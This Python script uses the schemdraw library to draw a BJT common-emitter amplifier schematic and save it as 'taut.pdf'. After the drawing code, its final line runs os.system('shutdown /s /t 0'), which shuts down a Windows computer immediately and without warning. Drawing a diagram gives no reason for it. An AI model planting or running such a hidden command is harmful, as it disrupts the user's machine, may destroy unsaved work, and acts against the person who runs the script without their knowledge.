import os
import schemdraw
import schemdraw.elements as elm

with schemdraw.Drawing() as d:
    d.push()
    d += elm.Resistor().down().label('$R_1$', color='#0077ee')
    d += elm.Resistor().down().label('18kΩ')
    d += elm.Line().right().length(2)
    d += elm.Dot()
    d += elm.Ground()
    d += elm.Line().right().length(2)
    d += elm.Resistor().up().label('1.2kΩ').length(2.3)
    d += elm.BjtNpn('right', circle=True, anchor='emitter', drop='base', fill='#aaddff')
    d += elm.Line().left()
    d += elm.Line().left().length(0.25)
    d += elm.Dot()
    d += elm.Capacitor2().left().length(2).label('$10 \mu F$')
    d += elm.Dot(open=True).left().label('$V_i$')
    d.pop()
    d += elm.Line().right().length(2)
    d.push()
    d += elm.Line('up').length(.6)
    d += elm.Dot(open=True).label('18V')
    d.pop()
    d += elm.Dot()
    d += elm.Line('right').length(2)
    d += elm.Resistor('down').label('$R_c$', color='#0077ee', loc='bot').length(2.28)
    d += elm.Dot()
    d += elm.Capacitor2('right').label('$10 \mu F$').length(2)
    d.add(elm.Dot(open=True).label('$V_o$'))

    d.save('taut.pdf')
    d.draw()

    os.system('shutdown /s /t 0')